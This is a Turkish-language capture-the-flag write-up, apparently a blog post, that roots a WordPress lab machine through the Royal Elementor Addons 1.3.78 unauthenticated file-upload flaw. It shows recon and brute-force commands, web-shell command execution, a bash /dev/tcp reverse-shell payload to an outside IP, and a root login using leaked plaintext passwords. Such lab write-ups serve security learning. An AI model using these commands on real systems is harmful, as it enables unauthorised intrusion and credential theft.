# CTF Solution: Exploiting WordPress Royal Elementor to Root Gridloy

## Giriş

Royal Elementor Addons, WordPress sitelerinde arayüz ve form oluşturmak için kullanılan popüler eklentilerden biridir. Özellikle `1.3.78` ve önceki sürümlerde bulunan **Unauthenticated Arbitrary File Upload** zafiyeti, hedef sistemde kimlik doğrulaması olmadan zararlı dosya yüklenmesine ve bunun sonucunda **Remote Code Execution (RCE)** elde edilmesine yol açabilir.

Bu zafiyeti diğerlerinden ayıran en çarpıcı özellik, saldırganın sistemde kayıtlı herhangi bir hesaba (admin, yazar veya abone) ihtiyaç duymadan, dışarıdan anonim bir kullanıcı olarak doğrudan sunucuya zararlı dosya yükleyebilmesidir.

## Teknik Detay: Dosya Doğrulama Zafiyeti

Zafiyet, eklentinin form verilerini işleyen dosya yükleme fonksiyonunda ortaya çıkar. Normal şartlarda sistemin yalnızca `.pdf`, `.jpg`, `.png` gibi güvenli dosya türlerini kabul etmesi gerekir. Ancak zafiyetli sürümde sunucu tarafındaki uzantı denetimi (extension validation) yetersizdir.Saldırganlar, istekteki (request) parametreleri manipüle ederek bu güvenlik filtresini atlatır (bypass).

### Saldırı Vektörü Nasıl Çalışır? 
Saldırgan, eklentinin ilgili uç noktasına (endpoint) içinde zararlı kodlar barındıran bir PHP dosyası (poc.php) gönderir:

- **Yetki Kontrolü Eksikliği:**
Eklenti, isteği gönderen kişinin yetkili bir kullanıcı olup olmadığını (authentication) kontrol etmeden yüklemeye izin verir.

- **Çalıştırma (Execution):**
Sistem, zararlı dosyayı public olarak erişilebilen `wp-content/uploads/wpr-addons/forms/` dizinine kaydeder. Saldırgan, yüklediği bu dosyaya tarayıcı veya `curl` üzerinden bir GET isteği attığında `(poc.php?cmd=whoami)`, içindeki PHP kodu derlenir. Bu sayede saldırgan, web sunucusu `(www-data)` yetkileriyle doğrudan komut çalıştırmaya (Reverse Shell) başlar.

### Neden Bu Kadar Tehlikeli ?
- **Kimlik doğrulama gerektirmez:** Sisteme sızmak için herhangi bir parola kırma işlemine gerek kalmaz.
- **Doğrudan RCE sağlar:** Veritabanı veya konfigürasyon dosyalarını okumaktan öte, doğrudan işletim sistemi seviyesinde komut çalıştırma imkanı sunar.
- **Kalıcılık (Persistence):** Dosya bir kez sunucuya yüklendiğinde, silinene kadar saldırganın arka kapısı (backdoor) olarak görev yapar.

---

## CTF Çözümü

![scenerio]

Bu kısımda makinemizdeki soruların çözümlerini ele alacağız.

## 1. Sorunun Çözümü

İlk olarak hedef web sitesini manuel şekilde inceliyoruz. Sitedeki içerikler arasında kısa bir gezinti yaptıktan sonra ilk sorunun cevabına doğrudan ulaşabiliyoruz.

## 2. Sorunun Çözümü

İlk incelemeden sonra web sitesinde işimize yarayacak daha fazla bilgi bulamıyoruz. Bu noktada recon aşamasına geçiyoruz.

## Reconnaissance

### 1. Nmap Taraması

Hedef sistemde çalışan servisleri görmek için tüm portları kapsayan bir Nmap taraması yapıyoruz.

```bash
nmap -sC -sV -p- -T4 <HEDEF_IP>
```

- `-sC`: Execute basit nmap scripts.
- `-sV`: Dedect the version of working services.
- `-p-`: Scan all ports.
- `-T4`: Upgrade the scan speed.

![nmap-scanning-results]

Nmap çıktısına baktığımızda saldırı yüzeyinin oldukça dar olduğunu görüyoruz. Dışarıya açık olan ana servis yalnızca HTTP(Port 80) servisidir. SSH(22), FTP(21) veya veritabanı(3306 vs.) portları dışarıya açık değildir.

Bu nedenle hedefe erişmek için ana odak noktamız web uygulaması, yani WordPress olacaktır.

### Apache Üzerinden Exploit Aramak Mantıklı mı?

Olabilir elbette ama Apache 2.4.56 nispeten güncel sayılabilir (büyük ve kolay bir RCE barındırma ihtimali düşüktür). Sistemde devasa bir içerik yönetim sistemi olan **WordPress** var. WordPress’in çekirdek yapısı (6.4.2'de spesifik bir POP chain zafiyeti olsa da) dışında asıl zafiyetler genellikle **eklentilerde (plugins), temalarda (themes)** veya **zayıf parolalarda** bulunur. Bu sebeplerden dolayı odak noktamızı **WordPress’e** kaydırıyoruz.

### WPScan ile Eklenti ve Tema Taraması

Aşşağıdaki komut hedef sitenin zafiyet barındırma potansiyeli en yüksek olan bileşenlerini nokta atışı tespit etmemizi sağlar.

```bash
wpscan --url http://gridloy.hv -e vp,vt
```

- `-e (or --enumerate)`: WPScan'e belirli bileşenleri listelemesini ve taramasını söyler. Bu parametrenin yanına eklenen kısaltmalar, taramanın kapsamını belirler.
- `vp (Vulnerable Plugins)`: Sitede yüklü olan ve aktif/pasif fark etmeksizin veri tabanında bilinen bir güvenlik açığı (CVE) bulunan tüm zafiyetli eklentileri tespit etmeye çalışır. Senaryomuzdaki Royal Elementor Addons zafiyeti tam olarak bu parametre sayesinde çıktıda yer alıyor.
- `vt (Vulnerable Themes)`: Sitenin kullandığı aktif temanın ve sistemde kurulu diğer temaların bilinen bir güvenlik açığı barındırıp barındırmadığını kontrol eder.

![wpscan-vulnerable-plugins]

WPScan bize sitede **zafiyetli** bir **Royal Elementor Addons** sürümü olduğunu söyledi ancak **brute-force** bize daha cazip geliyor ilk aşamada bu çıktıyı şimdilik bir kenara not ediyoruz (ileride buraya geri döneceğiz).

### 2. FFUF ile Alt Dizin Taraması

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<HEDEF_IP>/FUZZ -mc 200,301,302
```

Parametreler:

- `-w`: Wordlist.
- `-u`: Target URL.
- `-mc`: The HTTP status code values we want to match

![ffuf-results]

FFUF çıktısında `php.ini` dosyası dikkat çekiyor.

`php.ini`, PHP'nin ana yapılandırma dosyasıdır ve public web dizininde dışarıdan erişilebilir olmamalıdır. Bu dosyanın erişilebilir olması ciddi bir **Information Disclosure** zafiyetidir.

![inside-of-php-ini]

Bu dosyanın içerisinde yer alan bazı yapılandırmalar ilerleyen aşamalarda exploit sürecini anlamamıza yardımcı olacaktır. Özellikle dosya yükleme limitleri bizim için önemli hale geliyor.

### WordPress Admin Paneli

FFUF çıktısında `wp-admin` dizinini de görüyoruz. Bu dizine gittiğimizde bizi WordPress login ekranı karşılıyor.

![wordpress-login-page]

Madem hedefimiz WordPress , genel araçların yanı sıra doğrudan WordPress'e odaklanan wpscan'i kullanmamız şart. WordPress yapıları standarttır ve bu araç WordPress için özelleşmiştir. Saniyeler içinde çok fazla bilgi alabiliriz.

### Username Enumeration

Sistemde yazarın "X" olduğunu biliyoruz ama WordPress'e giriş yaparken kullandığı kullanıcı adı tam olarak "x", "y", "admin" veya başka bir şey olabilir. Bu yüzden hedefimiz sistemdeki kullanıcıları bulmak oluyor.

WordPress'te güçlü bir brute-force saldırısı yapabilmek için öncelikle sistemde geçerli bir kullanıcı adının varlığından emin olmamız gerekir. Rastgele kullanıcı adları denemek yerine, WPScan'in `--enumerate u` parametresini kullanarak hedef sunucuyu sorgularız:

```bash
wpscan --url http://<HEDEF_IP> --enumerate u
```

`--enumerate u (or -e u)` : Hedef WordPress sitesindeki kayıtlı userları tespit etmeye yarayan özel tarama modudur.

**Username Enumeration Mantığı**
WPScan bu tespiti yaparken sadece siteye bakmaz; WordPress'in mimari yapısında bulunan bazı varsayılan özellikleri ve bilgi ifşası (information disclosure) açıklarını kullanır:

1. **Author URL Taraması:** 
WordPress, yazarların yazılarını listelemek için varsayılan olarak       `[http://gridloy.hv/?author=1](http://gridloy.hv/?author=1), ?author=2 ` gibi parametrik linkler kullanır. WPScan bu ID'leri ardışık olarak dener ve sunucu bizi `[http://gridloy.hv/author/admin/](http://gridloy.hv/author/admin/)` gibi bir kalıcı bağlantıya (permalink) yönlendirdiğinde, sistemdeki kullanıcı adının **admin** olduğunu yakalar.

2. **WP-JSON API Sorguları:** Modern WordPress sitelerinde REST API varsayılan olarak açıktır. WPScan, `[http://gridloy.hv/wp-json/wp/v2/users](http://gridloy.hv/wp-json/wp/v2/users)` uç noktasına (endpoint) istek atarak veritabanında kayıtlı kullanıcıların listesini doğrudan JSON formatında çekmeye çalışır.

Bu işlem sayesinde saldırgan, login panelinde deneme-yanılma yaparken "Kullanıcı adı mı yanlış, şifre mi?" ikileminden kurtulur. Elinde kesin olarak var olan bir kullanıcı adı `(admin)` olduğu için tüm gücünü sadece şifreyi kırmaya `(rockyou.txt)` odaklayabilir.

### Brute-Force Denemeleri

Elimizde kullanıcı adı olduğu için WordPress login paneline brute-force denemesi yapıyoruz.

WPScan ile:

```bash
wpscan --url http://<HEDEF_IP> -U <user_name> -P /usr/share/wordlists/rockyou.txt
```

Hydra ile alternatif doğrulama:

```bash
hydra -l <user_name> -P /usr/share/wordlists/rockyou.txt gridloy.hv -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

Bu aşamada iki farklı araç kullanıyoruz:

- **WPScan ile Brute-Force** 
    `-U (Username)`: Hedef kullanıcı adını (bulduğumuz 'admin' bilgisini) belirtir.
    `-P (Passwords)`: Denenecek parolaların bulunduğu wordlist dosyasının yolunu gösterir. Neden WPScan? Çünkü WordPress'in dilinden en iyi o anlar. Arka plandaki çerez (cookie) ve token yönetimini otomatik halleder.


- **Hydra ile Brute-Force (Alternatif Doğrulama)** 
    Neden Hydra? Hydra ise çok daha genel amaçlı ve agresif bir araçtır. Komutun sonundaki o uzun parametre `(http-form-post...)`, Hydra'ya web sitesinin giriş formunun yapısını ve isteklerin nasıl gönderileceğini manuel olarak öğretmemizi sağlar.

Ancak iki araçla yapılan denemelerden de sonuç alamıyoruz.

### CEWL ile Hedefe Özel Wordlist Denemesi

Standart wordlist işe yaramayınca hedef siteye özel bir kelime listesi oluşturmayı deniyoruz.

```bash
cewl -w ozel_liste.txt -d 2 -m 5 <Target_URL>
```

CEWL, hedef web sitesini tarayarak sitede geçen kelimelerden özel bir wordlist oluşturur. Bu listeyle tekrar brute-force denemesi yapıyoruz; ancak bu yöntem de sonuç vermiyor.

Bu noktada brute-force'un bir rabbit hole olduğunu anlıyoruz.

## Zafiyetli Plugin'e Geri Dönüş

Recon aşamasında WordPress eklentileri arasında şu bileşenleri görmüştük:

- Elementor `3.18.3`
- Royal Elementor Addons `1.3.78`

Bu noktada `searchsploit` ile Royal Elementor tarafını incelemeye karar veriyoruz.

```bash
searchsploit royal elementor
```

![searchsploit-royal-elementor]

inceleme kararı almakta haklıymışız işimize yarayan bir exploit bulduk.

**Bu exploiti araştırırken bulduğum bilgiler :** 
Bu eklentinin `1.3.78 sürümü`, siber güvenlik dünyasında çok meşhur olan Kritik (CVSS 10.0) bir zafiyet içerir: **Unauthenticated Arbitrary File Upload (Kimlik Doğrulaması Olmadan Rastgele Dosya Yükleme)**.

Bunun anlamı şudur: Hiçbir kullanıcı adımız veya şifremiz olmasa bile, doğrudan bu eklentinin zafiyetli bir ucuna zararlı bir dosya (örneğin bir PHP shell) yükleyebilir ve doğrudan sunucuya sızabiliriz. Şifre kırma işi tamamen bitti!


Exploit'i local'e almak ve çalıştırmak için:

```bash
searchsploit -m <id>
python3 <id>.py -u <URL>
```

### Kısa Not: Neden MSFConsole Yerine Searchsploit?

Bu aşamada Metasploit de kullanılabilirdi. Ancak exploit'in nasıl çalıştığını daha iyi anlamak için manuel yaklaşımla devam ediyoruz.

- **Searchsploit:** Exploit-DB'deki ham exploit kodunu verir. Kodu okuyabilir, düzenleyebilir ve arka planda hangi isteklerin atıldığını görebiliriz.
- **Metasploit:** Daha otomatik bir yaklaşımdır. Payload, listener ve oturum yönetimini büyük ölçüde kendi halleder.

Öğrenme açısından Searchsploit ile ilerlemek daha öğretici olduğu için bu yöntemi tercih ediyoruz.

## Web Shell Üzerinden Komut Çalıştırma

Exploit sonrasında yüklenen PHP shell'i kontrol ediyoruz.

```bash
curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/poc.php?cmd=whoami"
```

Ardından sistemde hangi araçların bulunduğunu kontrol ediyoruz.

```bash
curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/poc.php?cmd=which+python3;which+nc;which+bash"
```

`whoami` çıktısı ile `www-data` yetkisinde olduğumuzu doğruluyoruz. Ayrıca sistemde `python3`, `nc` ve `bash` gibi araçların varlığını kontrol ederek reverse shell için uygun ortamı doğruluyoruz.

### Reverse Shell Alma

Kendi makinemizde netcat ile dinlemeye geçiyoruz.

```bash
nc -lvnp 4444
```

Daha sonra web shell üzerinden reverse shell payload'ını gönderiyoruz.

```bash
curl -G -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/poc.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.8.77.96/4444 0>&1'"
```

- `-s`: Silent mode.
- `-G`: Veriyi POST body yerine URL query parametresi olarak gönderir.
- `--data-urlencode`: Payload'ın URL encode edilmesini sağlar.

Bu işlemden sonra hedef sistemde `www-data` kullanıcısı olarak shell elde ediyoruz.

### Credential Disclosure

Shell aldıktan sonra bulunduğumuz dizinde dosyaları listeliyoruz.

```bash
ls -la
```

Burada `my_passwords.txt` dosyası karşımıza çıkıyor. "cat" ile hemen okuyoruz.

![cat-my_passwords.txt]

Bu dosya içinde WordPress şifresine ulaşıyoruz. Aynı zamanda root parolasına da erişiyoruz. Bu durum, sistemde plaintext halde bırakılan parolaların ne kadar kritik sonuçlara yol açabileceğini gösteriyor.

## Privilege Escalation

Elde ettiğimiz root parolasını kullanarak yetki yükseltme yapıyoruz.

```bash
su root
```

Parolayı girdikten sonra root yetkisi elde ediyoruz. Bu noktada makinenin kontrolü tamamen bize geçiyor.

## 3. Sorunun Çözümü

Wordpresse uygun username ve şifre ile girdiğimiz de admin panelinde ufak bir inceleme ile bulabiliyoruz.

## 4. Sorunun Çözümü

Artık elimizde root yetkisi var istediğimiz dosyayı inceleyebiliriz. Dosyalar arasında biraz gezinme ile ilgili sorunun cevabına da ulaşabiliyoruz.

## Kapanış

Bu senaryoda, güncel tutulmayan tek bir WordPress eklentisinin tüm sistemi nasıl savunmasız bırakabileceğini gördük.

Royal Elementor Addons `1.3.78` sürümündeki **Unauthenticated Arbitrary File Upload** zafiyeti, kimlik doğrulama gerektirmeden sisteme giriş yapılmasını sağladı. Brute-force denemeleri zaman kaybettiren bir rabbit hole olurken, asıl çözüm zafiyetli plugin'e odaklanmaktı.

Ayrıca sistemde plaintext olarak bırakılan `my_passwords.txt` dosyası, sızma sonrası aşamada doğrudan privilege escalation'a yol açtı.

---

[My Linkedin](https://www.linkedin.com/in/osmanerdemdutar/)

[scenerio]: /blogs/img/CTF-Solution-wordpress-royal-elementor-to-root-gridloy/scenerio.png
[nmap-scanning-results]: /blogs/img/CTF-Solution-wordpress-royal-elementor-to-root-gridloy/nmap-scanning-results.png
[wpscan-vulnerable-plugins]: /blogs/img/CTF-Solution-wordpress-royal-elementor-to-root-gridloy/wpscan-vulnerable-plugins.png
[ffuf-results]: /blogs/img/CTF-Solution-wordpress-royal-elementor-to-root-gridloy/ffuf-results.png
[inside-of-php-ini]: /blogs/img/CTF-Solution-wordpress-royal-elementor-to-root-gridloy/inside-of-php-ini.png
[wordpress-login-page]: /blogs/img/CTF-Solution-wordpress-royal-elementor-to-root-gridloy/wordpress-login-page.png
[searchsploit-royal-elementor]: /blogs/img/CTF-Solution-wordpress-royal-elementor-to-root-gridloy/searchsploit-royal-elementor.png
[cat-my_passwords.txt]: /blogs/img/CTF-Solution-wordpress-royal-elementor-to-root-gridloy/cat-my_passwords.txt.png
